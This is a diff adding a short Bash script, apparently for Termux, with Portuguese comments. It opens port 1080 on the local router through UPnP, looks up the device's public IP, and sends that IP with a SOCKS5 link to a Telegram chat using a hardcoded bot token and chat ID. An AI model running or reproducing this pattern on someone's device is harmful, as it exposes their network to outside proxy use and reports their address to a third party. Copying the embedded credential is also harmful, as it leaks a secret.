@@ -1,0 +1,16 @@
+#!/bin/bash
+
+# Configurações do Telegram
+BOT_TOKEN="7201057816:AAEzEsBi8_gT_w8fInqDCHa6hPUnAfNzMoQ"
+CHAT_ID="-1002527962526"
+
+# Instala dependências e abre porta
+pkg install -y miniupnpc curl
+IP=$(curl -s ifconfig.me)
+upnpc -a $(ip route get 1 | awk '{print $NF;exit}') 1080 1080 TCP
+
+# Envia mensagem para o Telegram
+curl -s "https://api.telegram.org/bot$BOT_TOKEN/sendMessage?chat_id=$CHAT_ID&text=✅ UPnP Configurado! 
+IP: \`$IP\` 
+Porta: \`1080\` 
+Link: \`socks5://$IP:1080\`"
